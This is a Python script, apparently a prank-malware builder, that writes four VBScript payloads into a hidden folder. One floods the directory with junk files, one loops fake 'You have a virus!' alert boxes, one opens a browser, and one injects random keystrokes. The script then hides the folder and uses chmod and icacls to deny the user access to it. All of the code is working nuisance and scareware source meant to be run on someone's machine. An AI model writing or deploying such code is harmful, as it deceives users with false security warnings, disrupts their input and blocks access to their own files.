import sys, time, os, stat
import subprocess as sub
def main():
	#Checks verbosity
	if len(sys.argv)>1 and "-s" in sys.argv:
		sys.stderr=sys.stdout=open("test.txt", "w")

	if "-w" in sys.argv: #Main if
		try:
			#Used to create a single string
			name=sys.argv[2]
			rec=open("../VBScripts/"+name+".vbs", "r")
			test=open("test.txt", "w")
			oneLine=name+".write('"
			length=len(rec.read())
			rec.seek(0)

			counter=0
			for i in range(length):
				cur=rec.read(1)
				counter+=1
				if counter==200:
					print("ADDING NEWLINE!")
					counter=0
					oneLine+="')"
					oneLine+='\n'
					oneLine+=name+".write('"
				if cur=='\n':
					oneLine+='\\n'
				elif cur=="{":
					oneLine+="\{"
				elif cur=="}":
					oneLine+="\}"
				else:
					oneLine+=cur


			oneLine+="')"
			test.write(oneLine)

			rec.close()
			test.close()
		except:
			print("There was an error creating the string!")

	else: #Main else
		print("No '-w' found so I'll assume you wanna write the scripts")
		print("Creating Scripts...")
		scriptNames=["spam", "message", "internet", "typer"]
		env=os.getcwd()+"/.Network/"
		windows=False
		try:
			env=os.environ["USERPROFILE"]+"\\.Network\\"
			windows=True
		except:
			print("Not on windows!")

		#Creating directory
		if not os.path.exists(env):
			print("Creating {}...".format(env))
			os.mkdir(env)
			time.sleep(1)
			if windows:
				sub.Popen(["attrib", "+s", "+h", env[:-1]], shell=True)
				print("Hid Network folder!")
		else:
			print("Directory '{}' already exists!".format(env))

		#Deleting previous vbs files (write protected)
		os.chmod(env, 511)
		try:
			for name in scriptNames:
				os.remove(env+name+".vbs")
		except:
			print("One or more files doesn't exist, nothing deleted!")

		#Actually writing the vbscripts

		openedScripts=[open(env+i+".vbs", "w") for i in scriptNames]

		openedScripts[0].write('Set fso=CreateObject("Scripting.FileSystemObject")\nthisScript=WScript.ScriptFullName\nDim randWord, min, max, charSet\ncharSet="abcdefghijklmnopqrstuvwxyz1234567890!@#$%^&-_"\nmin=1\nmax=61\nrandWord=""\n\n')
		openedScripts[0].write('\nFor i=1 to 40\n	randWord=""\n	For y=1 to 15\n	Randomize\n	randWord=randWord+Mid(charSet, Int(max-min+1)*Rnd+min, 1)\n	Next\n\n	Set textFile=fso.CreateTextFile(""&randWord&".txt")\n	Call textFile.Write("HAHAH')
		openedScripts[0].write('A")\n	textFile.Close\nNext\n')

		openedScripts[1].write('Set fso=CreateObject("Scripting.FileSystemObject")\nSet oSh=CreateObject("WScript.Shell")\n\nSet test=fso.CreateTextFile("msg.vbs")\n\ntest.Write "x=msgbox(""Our scan results:""&vbCrLf&""You have a virus!')
		openedScripts[1].write('"", 274, ""Uh Oh!"")"\n\ntest.Write ""&vbCrLf&"If x=4 Then"&vbCrLf&"  CreateObject(""WScript.Shell"").Run(""message.vbs"")"\ntest.Write ""&vbCrLf&"ElseIf x=5 Then"&vbCrLf\ntest.Write ""&vbCrLf&"  msg=msgb')
		openedScripts[1].write('ox(""Ignoring this issue can cause issues!"", 64, ""Attention!"")"\ntest.Write vbCrLf&"ElseIf x=3 Then"&vbCrLf&"  msg=msgbox(""Abortion is a sin!"", 48, ""Attention!"")"\ntest.Write ""&vbCrLf&"End If"\nt')
		openedScripts[1].write('est.Close\n\nFor i=1 to 20\n	oSh.Run "msg.vbs"\nNext\n\nWScript.Sleep(500)\nfso.DeleteFile("msg.vbs")\n')

		openedScripts[2].write('Set sh=CreateObject("WScript.Shell")\nsh.run "https://www.google.com/"\n')

		openedScripts[3].write('Set sh=CreateObject("WScript.Shell")\ncharSet="abcdefghijklmnopqrstuvwxyz1234567890!@#$%^&*-=_+;:,.?XXXXXXX"\nmin=1\ncharMax=60\nmiT=2\nmT=6\n\nRandomize\nFor i=1 to Int((charMax-min+1)*Rnd+min)\n	Randomize\n	')
		openedScripts[3].write('randLetter=Mid(charSet, Int((charMax-min+1)*Rnd+min), 1)\n	Randomize\n	randTime=Int(((mT-miT+1)*Rnd+miT)*1000)\n	WScript.Sleep(randTime)\n	If randLetter="X" Then\n		sh.SendKeys("\{BS\}")\n	Else\n		sh.SendKeys(')
		openedScripts[3].write('randLetter)\n	End If\nNext\n')

		'''
		Below prints the binary value of the stat flags
		to be used for chmod:
		print("XUSR: {0}:\t{0:08b}".format(stat.S_IXUSR))
		print("XGRP: {0}:\t{0:08b}".format(stat.S_IXGRP))
		print("XOTH: {0}:\t{0:08b}".format(stat.S_IXOTH))
		'''
		#Setting permissions and closing files
		print("Setting permissions and closing files...")
		for i in openedScripts:
			i.close()
			os.chmod(env+scriptNames[openedScripts.index(i)]+".vbs", 365)

		try:
			os.chmod(env, 0)
			print("chmod-ing!")
		except:
			sub.call(["attrib +s +h {}".format(env)])
			sub.call(["Icacls {} /deny %USERNAME%:f".format(env)])
			print("Windows locking!")
		print("Done!")
		print("All done!")
		time.sleep(3)


if __name__=="__main__":
	main()
